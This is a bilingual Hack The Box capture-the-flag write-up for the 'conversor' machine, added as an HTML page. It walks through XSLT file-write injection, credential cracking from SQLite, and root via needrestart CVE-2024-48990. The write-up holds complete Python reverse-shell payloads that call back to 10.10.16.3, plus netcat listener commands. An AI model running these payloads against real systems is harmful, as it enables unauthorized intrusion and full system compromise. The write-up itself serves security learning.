@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>conversor | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">conversor</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine exposed a web application that converted XML and XSLT files to HTML. While the XML parser was properly secured against common XXE attacks, the XSLT processor lacked sufficient protections, allowing arbitrary file write operations through XSLT injection.</p>
+                    
+                    <p>By exploiting the XSLT processor's file write functionality and leveraging a documented cron job that automatically executed Python scripts from <code>/var/www/conversor.htb/scripts/</code>, I was able to inject a malicious Python reverse shell script and gain initial access as the <code>www-data</code> user.</p>
+                    
+                    <p>After obtaining initial access, I discovered SQLite database credentials that allowed lateral movement to the <code>fismathack</code> user. This user had <code>sudo</code> privileges to execute <code>/usr/sbin/needrestart</code> without a password. By exploiting CVE-2024-48990, a Python library hijacking vulnerability in needrestart that incorrectly reads the <code>PYTHONPATH</code> environment variable from <code>/proc/&lt;pid&gt;/environ</code>, I achieved privilege escalation to root.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> XSLT injection via <code>exsl:document</code> extension for arbitrary file write, cron job abuse, SQLite credential extraction, needrestart Python library hijacking (CVE-2024-48990).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services running on the target machine:</p>
+                <p><img src="./media/image2.png"
+                        alt="Nmap scan results showing open ports on the target machine" /></p>
+
+                <p>The scan reveals SSH on port 22 and HTTP on port 80. I proceed to enumerate the web service.</p>
+
+                <h2>Web Application Analysis</h2>
+                <p>The web application provides functionality to convert XML and XSLT files to formatted HTML output:</p>
+                <p><img src="./media/image1.png"
+                        alt="Web application interface showing XML to XSLT conversion functionality" /></p>
+
+                <p>This is an interesting attack surface since XSLT processing can sometimes lead to vulnerabilities like server-side request forgery (SSRF), arbitrary file read, or even code execution depending on the implementation and libraries used.</p>
+
+                <h3>Source Code Discovery</h3>
+                <p>While exploring the application, I discover the source code is available at the <code>/about</code> route. I download and inspect it to understand the application's internals.</p>
+
+                <p>From the source code analysis, I identify several key details:</p>
+                <ul>
+                    <li>The application uses an SQLite3 database</li>
+                    <li>The XML parser is properly secured with strict options that prevent common XXE attacks:
+                        <code>parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)</code>
+                    </li>
+                    <li>The XSLT processor, however, lacks similar protections and may be exploitable</li>
+                </ul>
+
+                <h2>XSLT Injection Research</h2>
+                <p>Researching XSLT injection techniques, I find valuable resources like <a
+                        href="https://ine.com/blog/xslt-injections-for-dummies">https://ine.com/blog/xslt-injections-for-dummies</a>
+                    that explain how to exploit XSLT processors.</p>
+
+                <p>I begin testing with system property enumeration to fingerprint the XSLT processor. I inject the
+                    following XSLT code:</p>
+
+                <pre><code class="language-xml">&lt;xsl:value-of select="system-property('xsl:version')" /&gt;
+&lt;xsl:value-of select="system-property('xsl:vendor')" /&gt;
+&lt;xsl:value-of select="system-property('xsl:vendor-url')" /&gt;</code></pre>
+
+                <p>The application responds with:</p>
+                <pre><code class="language-plaintext">1.0
+libxslt
+http://xmlsoft.org/XSLT/</code></pre>
+
+                <p>This confirms the server is using <code>libxslt</code> version 1.0. I attempt various payloads for
+                    file reading and code execution using PHP extensions, but these attempts fail and only produce
+                    errors.</p>
+
+                <h3>File Write Discovery</h3>
+                <p>After unsuccessful attempts at file reading and code execution, I shift focus to file write
+                    capabilities. During my source code review, I had noticed an interesting detail in the
+                    <code>install.md</code> file:</p>
+
+                <blockquote>
+                    <p>"If you want to run Python scripts (for example, our server deletes all files older than 60
+                        minutes to avoid system overload), you can add the following line to your
+                        <code>/etc/crontab</code>:</p>
+                    <p><code>* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done</code>
+                    </p>
+                </blockquote>
+
+                <p>This reveals a critical piece of information: there's a cron job running every minute that executes
+                    all Python scripts in <code>/var/www/conversor.htb/scripts/</code> as the <code>www-data</code>
+                    user. If I can write a file to this directory, I can achieve code execution.</p>
+
+                <h2>Initial Access - XSLT File Write Exploitation</h2>
+                <p>To exploit this, I craft an XSLT payload that uses the <code>exsl:document</code> extension to write
+                    a Python reverse shell to the scripts directory:</p>
+
+                <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;xsl:stylesheet version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:exsl="http://exslt.org/common"
+    extension-element-prefixes="exsl"&gt;
+    
+    &lt;xsl:template match="/"&gt;
+        &lt;exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text"&gt;
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.16.3",443))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
+        &lt;/exsl:document&gt;
+        &lt;success&gt;File written!&lt;/success&gt;
+    &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</code></pre>
+
+                <p>This XSLT template uses the <code>exsl:document</code> element to write content to an arbitrary file
+                    path. The payload contains a Python reverse shell that will connect back to my machine on port 443.
+                </p>
+
+                <p>Before uploading the malicious XSLT, I set up a netcat listener:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>After uploading the XSLT file through the web interface, I wait for the cron job to execute. Within
+                    a minute, I receive the reverse shell connection and gain access as the <code>www-data</code> user.
+                </p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>After stabilizing my shell with the standard Python TTY technique, I begin enumerating the system. I
+                    discover a user named <code>fismathack</code> in <code>/home</code>.</p>
+
+                <h3>SQLite Database Credential Extraction</h3>
+                <p>Remembering from the source code that the application uses an SQLite3 database, I locate and examine
+                    it. Inside, I find password hashes for users. Using a hash cracking tool, I successfully crack one
+                    of the hashes and obtain valid credentials:</p>
+
+                <pre><code class="language-plaintext">fismathack:Keepmesafeandwarm</code></pre>
+
+                <p>I use these credentials to switch to the <code>fismathack</code> user and retrieve the user flag.</p>
+
+                <h2>Privilege Escalation - Needrestart Analysis</h2>
+                <p>After gaining access as <code>fismathack</code>, I check for sudo privileges:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>The output reveals an interesting permission:</p>
+                <pre><code class="language-plaintext">User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart</code></pre>
+
+                <p>The <code>needrestart</code> binary isn't a standard tool I'm familiar with, so I investigate
+                    further. Running <code>cat /usr/sbin/needrestart</code>, I see it's actually a Perl script:</p>
+
+                <pre><code class="language-perl">#!/usr/bin/perl
+# nagios: -epn
+# needrestart - Restart daemons after library updates.</code></pre>
+
+                <p>The script is quite lengthy, but it's open source and available at <a
+                        href="https://github.com/liske/needrestart">https://github.com/liske/needrestart</a>. This tool
+                    is used to determine which daemons need to be restarted after library updates.</p>
+
+                <h3>CVE Research - CVE-2024-48990</h3>
+                <p>Searching for known vulnerabilities, I discover a recent security disclosure detailing multiple CVEs
+                    affecting needrestart: <a
+                        href="https://www.openwall.com/lists/oss-security/2024/11/19/1">https://www.openwall.com/lists/oss-security/2024/11/19/1</a>
+                </p>
+
+                <p>Among the disclosed vulnerabilities, I focus on <a
+                        href="https://nvd.nist.gov/vuln/detail/CVE-2024-48990">CVE-2024-48990</a>, which is
+                    particularly interesting for privilege escalation.</p>
+
+                <h3>Understanding CVE-2024-48990</h3>
+                <p>This vulnerability is a Python library hijacking attack with a unique twist: instead of reading
+                    environment variables from the sanitized sudo environment, <code>needrestart</code> reads the
+                    <code>PYTHONPATH</code> variable directly from <code>/proc/&lt;pid&gt;/environ</code> of running
+                    processes.</p>
+
+                <p>The exploitation flow works as follows:</p>
+                <ol>
+                    <li>Set <code>PYTHONPATH</code> to a directory I control (e.g., <code>/home/fismathack</code>)</li>
+                    <li>Create a malicious Python module in that directory that will be imported</li>
+                    <li>Start a Python process with this <code>PYTHONPATH</code> set</li>
+                    <li>Run <code>sudo needrestart</code>, which will scan running processes</li>
+                    <li>When needrestart finds the Python process, it reads its <code>PYTHONPATH</code> from
+                        <code>/proc/&lt;pid&gt;/environ</code></li>
+                    <li>Needrestart spawns a child process that inherits this <code>PYTHONPATH</code></li>
+                    <li>When the child process imports Python modules, it loads the malicious module from the hijacked
+                        path</li>
+                </ol>
+
+                <h2>Exploiting CVE-2024-48990 for Root Access</h2>
+                <p>To exploit this vulnerability, I follow these steps:</p>
+
+                <p><strong>Step 1:</strong> Create the malicious module structure. I create an <code>importlib</code>
+                    directory in <code>/home/fismathack</code> with a malicious <code>__init__.py</code> file containing
+                    a reverse shell:</p>
+
+                <pre><code class="language-bash">mkdir -p /home/fismathack/importlib
+cat > /home/fismathack/importlib/__init__.py << 'EOF'
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.16.3",443))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
+EOF</code></pre>
+
+                <p><strong>Step 2:</strong> Create a simple Python script that runs in an infinite loop with the
+                    <code>PYTHONPATH</code> environment variable set:</p>
+
+                <pre><code class="language-python"># main.py
+while True:
+    pass</code></pre>
+
+                <p><strong>Step 3:</strong> Execute this script with the <code>PYTHONPATH</code> set to my home
+                    directory:</p>
+
+                <pre><code class="language-bash">PYTHONPATH=/home/fismathack python3 main.py &</code></pre>
+
+                <p><strong>Step 4:</strong> Set up a netcat listener on my attacking machine:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p><strong>Step 5:</strong> From another terminal session as <code>fismathack</code>, run needrestart
+                    with sudo:</p>
+
+                <pre><code class="language-bash">sudo /usr/sbin/needrestart</code></pre>
+
+                <p>When needrestart executes, it scans running processes and finds the <code>main.py</code> process. It
+                    reads the <code>PYTHONPATH=/home/fismathack</code> from <code>/proc/&lt;pid&gt;/environ</code> and
+                    uses this path when spawning its own child process. When the child process executes <code>import
+                        sys</code> or similar imports, it triggers the loading of the <code>importlib</code> module from
+                    my home directory, executing the reverse shell payload as root:</p>
+
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.11.92] 35348
+# whoami
+root
+# cat /root/root.txt</code></pre>
+
+                <p>With this, I have successfully escalated privileges to root and completed the machine.</p>
+
+                <h3>Additional Resources</h3>
+                <p>For a detailed step-by-step guide on exploiting this vulnerability, this article provides excellent
+                    coverage: <a
+                        href="https://medium.com/@allypetitt/rediscovering-cve-2024-48990-and-crafting-my-own-exploit-ce13829f5e80">https://medium.com/@allypetitt/rediscovering-cve-2024-48990-and-crafting-my-own-exploit-ce13829f5e80</a>
+                </p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> La máquina objetivo exponía una aplicación web que convertía archivos XML y XSLT a HTML. Mientras que el parseador XML estaba correctamente protegido contra ataques XXE comunes, el procesador XSLT carecía de protecciones suficientes, permitiendo operaciones de escritura de archivos arbitrarios mediante inyección XSLT.</p>
+                    
+                    <p>Explotando la funcionalidad de escritura de archivos del procesador XSLT y aprovechando un cron job documentado que ejecutaba automáticamente scripts Python desde <code>/var/www/conversor.htb/scripts/</code>, pude inyectar un script malicioso de reverse shell en Python y obtener acceso inicial como usuario <code>www-data</code>.</p>
+                    
+                    <p>Tras obtener el acceso inicial, descubrí credenciales en una base de datos SQLite que permitieron movimiento lateral al usuario <code>fismathack</code>. Este usuario tenía privilegios <code>sudo</code> para ejecutar <code>/usr/sbin/needrestart</code> sin contraseña. Explotando CVE-2024-48990, una vulnerabilidad de secuestro de bibliotecas Python en needrestart que lee incorrectamente la variable de entorno <code>PYTHONPATH</code> desde <code>/proc/&lt;pid&gt;/environ</code>, logré escalar privilegios a root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Inyección XSLT mediante extensión <code>exsl:document</code> para escritura arbitraria de archivos, abuso de cron job, extracción de credenciales SQLite, secuestro de biblioteca Python en needrestart (CVE-2024-48990).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image2.png"
+                        alt="Resultados del escaneo nmap mostrando puertos abiertos en la máquina objetivo" /></p>
+
+                <p>El escaneo revela SSH en el puerto 22 y HTTP en el puerto 80. Procedo a enumerar el servicio web.</p>
+
+                <h2>Análisis de la Aplicación Web</h2>
+                <p>La aplicación web proporciona funcionalidad para convertir archivos XML y XSLT a salida HTML formateada:</p>
+                <p><img src="./media/image1.png"
+                        alt="Interfaz de la aplicación web mostrando la funcionalidad de conversión XML a XSLT" /></p>
+
+                <p>Esta es una superficie de ataque interesante ya que el procesamiento XSLT puede llevar a veces a vulnerabilidades como SSRF (Server-Side Request Forgery), lectura arbitraria de archivos o incluso ejecución de código dependiendo de la implementación y las bibliotecas utilizadas.</p>
+
+                <h3>Descubrimiento del Código Fuente</h3>
+                <p>Mientras exploro la aplicación, descubro que el código fuente está disponible en la ruta <code>/about</code>. Lo descargo e inspecciono para entender las características internas de la aplicación.</p>
+
+                <p>Del análisis del código fuente, identifico varios detalles clave:</p>
+                <ul>
+                    <li>La aplicación usa una base de datos SQLite3</li>
+                    <li>El parseador XML está correctamente protegido con opciones estrictas que previenen ataques XXE comunes:
+                        <code>parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)</code>
+                    </li>
+                    <li>El procesador XSLT, sin embargo, carece de protecciones similares y podría ser explotable</li>
+                </ul>
+
+                <h2>Investigación de Inyección XSLT</h2>
+                <p>Investigando técnicas de inyección XSLT, encuentro recursos valiosos como <a
+                        href="https://ine.com/blog/xslt-injections-for-dummies">https://ine.com/blog/xslt-injections-for-dummies</a>
+                    que explican cómo explotar procesadores XSLT.</p>
+
+                <p>Comienzo probando con enumeración de propiedades del sistema para hacer fingerprinting del procesador XSLT. Inyecto el siguiente código XSLT:</p>
+
+                <pre><code class="language-xml">&lt;xsl:value-of select="system-property('xsl:version')" /&gt;
+&lt;xsl:value-of select="system-property('xsl:vendor')" /&gt;
+&lt;xsl:value-of select="system-property('xsl:vendor-url')" /&gt;</code></pre>
+
+                <p>La aplicación responde con:</p>
+                <pre><code class="language-plaintext">1.0
+libxslt
+http://xmlsoft.org/XSLT/</code></pre>
+
+                <p>Esto confirma que el servidor está usando <code>libxslt</code> versión 1.0. Intento varios payloads
+                    para lectura de archivos y ejecución de código usando extensiones PHP, pero estos intentos fallan y
+                    solo producen errores.</p>
+
+                <h3>Descubrimiento de Escritura de Archivos</h3>
+                <p>Después de intentos fallidos de lectura de archivos y ejecución de código, cambio el enfoque a capacidades de escritura de archivos. Durante mi revisión del código fuente, había notado un detalle interesante en el archivo <code>install.md</code>:</p>
+
+                <blockquote>
+                    <p>"Si queréis ejecutar scripts Python (por ejemplo, nuestro servidor elimina todos los archivos más antiguos de 60 minutos para evitar sobrecarga del sistema), podéis añadir la siguiente línea a vuestro <code>/etc/crontab</code>:</p>
+                    <p><code>* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done</code></p>
+                </blockquote>
+
+                <p>Esto revela una pieza de información crítica: hay un cron job ejecutándose cada minuto que ejecuta todos los scripts Python en <code>/var/www/conversor.htb/scripts/</code> como usuario <code>www-data</code>. Si puedo escribir un archivo en este directorio, podré conseguir ejecución de código.</p>
+
+                <h2>Acceso Inicial - Explotación de Escritura de Archivos XSLT</h2>
+                <p>Para explotar esto, creo un payload XSLT que usa la extensión <code>exsl:document</code> para escribir una reverse shell en Python en el directorio de scripts:</p>
+
+                <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;xsl:stylesheet version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:exsl="http://exslt.org/common"
+    extension-element-prefixes="exsl"&gt;
+    
+    &lt;xsl:template match="/"&gt;
+        &lt;exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text"&gt;
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.16.3",443))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
+        &lt;/exsl:document&gt;
+        &lt;success&gt;File written!&lt;/success&gt;
+    &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</code></pre>
+
+                <p>Esta plantilla XSLT usa el elemento <code>exsl:document</code> para escribir contenido en una ruta de archivo arbitraria. El payload contiene una reverse shell en Python que se conectará de vuelta a mi máquina en el puerto 443.</p>
+
+                <p>Antes de subir el XSLT malicioso, configuro un listener de netcat:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Después de subir el archivo XSLT a través de la interfaz web, espero a que el cron job se ejecute. En menos de un minuto, recibo la conexión de reverse shell y obtengo acceso como usuario <code>www-data</code>.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Después de estabilizar mi shell con la técnica estándar de TTY de Python, comienzo a enumerar el sistema. Descubro un usuario llamado <code>fismathack</code> en <code>/home</code>.</p>
+
+                <h3>Extracción de Credenciales de la Base de Datos SQLite</h3>
+                <p>Recordando del código fuente que la aplicación usa una base de datos SQLite3, la localizo y examino. Dentro, encuentro hashes de contraseñas para usuarios. Usando una herramienta de crackeo de hashes, consigo crackear exitosamente uno de los hashes y obtengo credenciales válidas:</p>
+
+                <pre><code class="language-plaintext">fismathack:Keepmesafeandwarm</code></pre>
+
+                <p>Uso estas credenciales para cambiar al usuario <code>fismathack</code> y recupero la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios - Análisis de Needrestart</h2>
+                <p>Después de obtener acceso como <code>fismathack</code>, compruebo los privilegios sudo:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>La salida revela un permiso interesante:</p>
+                <pre><code class="language-plaintext">User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart</code></pre>
+
+                <p>El binario <code>needrestart</code> no es una herramienta estándar que me sea familiar, así que investigo más a fondo. Ejecutando <code>cat /usr/sbin/needrestart</code>, veo que en realidad es un script Perl:</p>
+
+                <pre><code class="language-perl">#!/usr/bin/perl
+# nagios: -epn
+# needrestart - Restart daemons after library updates.</code></pre>
+
+                <p>El script es bastante largo, pero es código abierto y está disponible en <a
+                        href="https://github.com/liske/needrestart">https://github.com/liske/needrestart</a>. Esta herramienta se usa para determinar qué demonios necesitan reiniciarse después de actualizaciones de bibliotecas.</p>
+
+                <h3>Investigación de CVEs - CVE-2024-48990</h3>
+                <p>Buscando vulnerabilidades conocidas, descubro una revelación de seguridad reciente detallando múltiples CVEs que afectan a needrestart: <a
+                        href="https://www.openwall.com/lists/oss-security/2024/11/19/1">https://www.openwall.com/lists/oss-security/2024/11/19/1</a>
+                </p>
+
+                <p>Entre las vulnerabilidades reveladas, me centro en <a
+                        href="https://nvd.nist.gov/vuln/detail/CVE-2024-48990">CVE-2024-48990</a>, que es particularmente interesante para escalada de privilegios.</p>
+
+                <h3>Entendiendo CVE-2024-48990</h3>
+                <p>Esta vulnerabilidad es un ataque de secuestro de bibliotecas Python con un giro único: en lugar de leer variables de entorno del entorno sanitizado de sudo, <code>needrestart</code> lee la variable <code>PYTHONPATH</code> directamente desde <code>/proc/&lt;pid&gt;/environ</code> de los procesos en ejecución.</p>
+
+                <p>El flujo de explotación funciona así:</p>
+                <ol>
+                    <li>Establecer <code>PYTHONPATH</code> a un directorio que controlo (ej., <code>/home/fismathack</code>)</li>
+                    <li>Crear un módulo Python malicioso en ese directorio que será importado</li>
+                    <li>Iniciar un proceso Python con este <code>PYTHONPATH</code> establecido</li>
+                    <li>Ejecutar <code>sudo needrestart</code>, que escaneará los procesos en ejecución</li>
+                    <li>Cuando needrestart encuentra el proceso Python, lee su <code>PYTHONPATH</code> desde
+                        <code>/proc/&lt;pid&gt;/environ</code></li>
+                    <li>Needrestart genera un proceso hijo que hereda este <code>PYTHONPATH</code></li>
+                    <li>Cuando el proceso hijo importa módulos Python, carga el módulo malicioso desde la ruta secuestrada</li>
+                </ol>
+
+                <h2>Explotando CVE-2024-48990 para Acceso Root</h2>
+                <p>Para explotar esta vulnerabilidad, sigo estos pasos:</p>
+
+                <p><strong>Paso 1:</strong> Crear la estructura del módulo malicioso. Creo un directorio <code>importlib</code> en <code>/home/fismathack</code> con un archivo <code>__init__.py</code> malicioso que contiene una reverse shell:</p>
+
+                <pre><code class="language-bash">mkdir -p /home/fismathack/importlib
+cat > /home/fismathack/importlib/__init__.py << 'EOF'
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.16.3",443))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
+EOF</code></pre>
+
+                <p><strong>Paso 2:</strong> Crear un script Python simple que se ejecute en un bucle infinito con la variable de entorno <code>PYTHONPATH</code> establecida:</p>
+
+                <pre><code class="language-python"># main.py
+while True:
+    pass</code></pre>
+
+                <p><strong>Paso 3:</strong> Ejecutar este script con el <code>PYTHONPATH</code> establecido a mi directorio home:</p>
+
+                <pre><code class="language-bash">PYTHONPATH=/home/fismathack python3 main.py &</code></pre>
+
+                <p><strong>Paso 4:</strong> Configurar un listener de netcat en mi máquina atacante:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p><strong>Paso 5:</strong> Desde otra sesión de terminal como <code>fismathack</code>, ejecutar needrestart con sudo:</p>
+
+                <pre><code class="language-bash">sudo /usr/sbin/needrestart</code></pre>
+
+                <p>Cuando needrestart se ejecuta, escanea los procesos en ejecución y encuentra el proceso <code>main.py</code>. Lee el <code>PYTHONPATH=/home/fismathack</code> desde <code>/proc/&lt;pid&gt;/environ</code> y usa esta ruta cuando genera su propio proceso hijo. Cuando el proceso hijo ejecuta <code>import sys</code> o imports similares, desencadena la carga del módulo <code>importlib</code> desde mi directorio home, ejecutando el payload de reverse shell como root:</p>
+
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.11.92] 35348
+# whoami
+root
+# cat /root/root.txt</code></pre>
+
+                <p>Con esto, he escalado exitosamente privilegios a root y completado la máquina.</p>
+
+                <h3>Recursos Adicionales</h3>
+                <p>Para una guía detallada paso a paso sobre cómo explotar esta vulnerabilidad, este artículo proporciona una cobertura excelente: <a
+                        href="https://medium.com/@allypetitt/rediscovering-cve-2024-48990-and-crafting-my-own-exploit-ce13829f5e80">https://medium.com/@allypetitt/rediscovering-cve-2024-48990-and-crafting-my-own-exploit-ce13829f5e80</a>
+                </p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
